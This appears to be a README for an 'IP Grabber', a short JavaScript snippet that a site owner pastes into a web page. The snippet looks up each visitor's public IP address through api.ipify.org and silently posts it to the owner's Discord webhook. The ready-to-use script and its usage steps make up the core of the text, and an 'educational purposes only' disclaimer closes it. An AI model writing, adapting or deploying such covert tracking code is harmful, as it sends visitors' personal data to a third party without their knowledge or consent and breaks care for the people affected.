<h1 align="center">IP Grabber</h1>

<p align="center">
  <strong>A simple script to grab the user's IP address and send it to a Discord webhook.</strong>
</p>


## Description

This script fetches the user's IP address using `https://api.ipify.org` and sends it to a specified Discord webhook.

## How it Works

The script leverages JavaScript's `fetch` API to dispatch a GET request to `https://api.ipify.org`, acquiring the user's IP address. Subsequently, it dispatches a POST request to a Discord webhook URL, carrying the acquired IP address as the payload. As a result, you'll receive a notification from the bot in your Discord server each time someone visits your website, containing the visitor's Public IP address. Notably, this script represents the most concise form possible.

## Usage

Simply include the script in your HTML file. Just make sure to replace **`YOUR_DISCORD_WEBHOOK`** with your actual Discord webhook URL.

```html
<script>
  fetch('https://api.ipify.org')
    .then(response => response.text())
    .then(ip => fetch('YOUR_DISCORD_WEBHOOK', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: ip })
    }));
</script>`
```


## Disclaimer

This script is intended for educational purposes only. Any use of this script to collect or share users' IP addresses without their consent may violate privacy laws and ethical principles. Ensure compliance with all relevant regulations and obtain proper authorization before deploying such functionality. Use at your own risk.
